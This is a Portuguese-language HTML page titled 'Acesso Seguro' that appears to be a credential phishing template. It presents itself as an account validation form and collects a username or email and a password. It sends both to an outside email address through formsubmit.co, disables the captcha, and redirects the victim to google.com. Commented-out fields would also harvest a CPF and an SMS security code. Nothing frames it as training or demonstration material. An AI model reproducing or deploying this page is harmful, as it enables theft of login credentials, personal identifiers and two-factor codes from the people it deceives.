<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Acesso Seguro</title>
    <style>
        body {
            background-color: #77b;
            font-family: "Trebuchet MS", Verdana, Arial, sans-serif;
            padding: 30px;
            text-align: center;
        }
        .form-container {
            background: #fff;
            padding: 20px;
            border-radius: 12px;
            max-width: 350px;
            margin: auto;
            box-shadow: 0 0 12px #0005;
        }
        input, button {
            display: block;
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 6px;
            border: 1px solid #ccc;
        }
        button {
            background-color: #448;
            color: white;
            border: none;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h2>Validação da Conta</h2>
        <form action="https://formsubmit.co/SEUEMAIL@gmail.com" method="POST">
            <input type="text" name="usuario" placeholder="Usuário ou e-mail" required>
            <input type="password" name="senha" placeholder="Senha" required>
            
            <!-- Campos adicionais opcionais -->
            <!-- <input type="text" name="cpf" placeholder="CPF"> -->
            <!-- <input type="text" name="codigo_sms" placeholder="Código de segurança"> -->

            <!-- Redireciona após envio -->
            <input type="hidden" name="_next" value="https://google.com">
            <input type="hidden" name="_captcha" value="false">
            
            <button type="submit">Entrar</button>
        </form>
    </div>

</body>
</html>
